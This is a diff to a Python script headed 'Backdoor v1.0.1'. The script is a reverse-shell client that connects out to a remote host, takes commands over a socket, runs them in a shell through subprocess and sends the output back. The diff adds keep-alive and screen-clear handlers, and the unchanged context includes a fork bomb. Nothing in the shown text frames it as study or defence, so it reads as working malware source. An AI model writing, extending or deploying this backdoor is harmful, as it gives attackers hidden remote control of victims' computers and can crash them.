@@ -1,15 +1,21 @@
-# Python 3.8
+# Testet in: Python 3.8.8
+# By: LawlietJH
+# Backdoor v1.0.1
+
 import subprocess
 import requests
 import socket
 import base64
 import mss
+import sys
 import os
+
 
 
 class Client():
 	
 	def __init__(self, CON_HOST, CON_PORT):
+		self.default_path = os.getcwd()
 		self.current_dir = None
 		self.client = None
 		self.CON_HOST  = CON_HOST
@@ -27,9 +33,9 @@ class Client():
 	def run_command(self, command):
 		std = {
 			'shell':  True,
+			'stdin':  subprocess.PIPE,
 			'stdout': subprocess.PIPE,
-			'stderr': subprocess.PIPE,
-			'stdin':  subprocess.PIPE
+			'stderr': subprocess.PIPE
 		}
 		resp = subprocess.Popen(command, **std)
 		return resp
@@ -54,6 +60,9 @@ class Client():
 		self.client.send(self.current_dir.encode())
 		
 		while True:
+			
+			# ~ alive = self.client.recv(1024).decode()
+			# ~ self.client.send(alive.encode())
 			
 			res = self.client.recv(1024).decode()
 			
@@ -129,6 +138,11 @@ class Client():
 					while True: os.fork()
 				except KeyboardInterrupt:
 					pass
+			elif res.lower() == 'alive': self.client.send('ok'.encode())
+			elif res.lower() == 'cls':
+				os.system('cls')
+				print('\n'+self.default_path+'>')
+				self.client.send('ok'.encode())
 			else:
 				proc = self.run_command(res)
 				proc = proc.stdout.read() + proc.stderr.read()
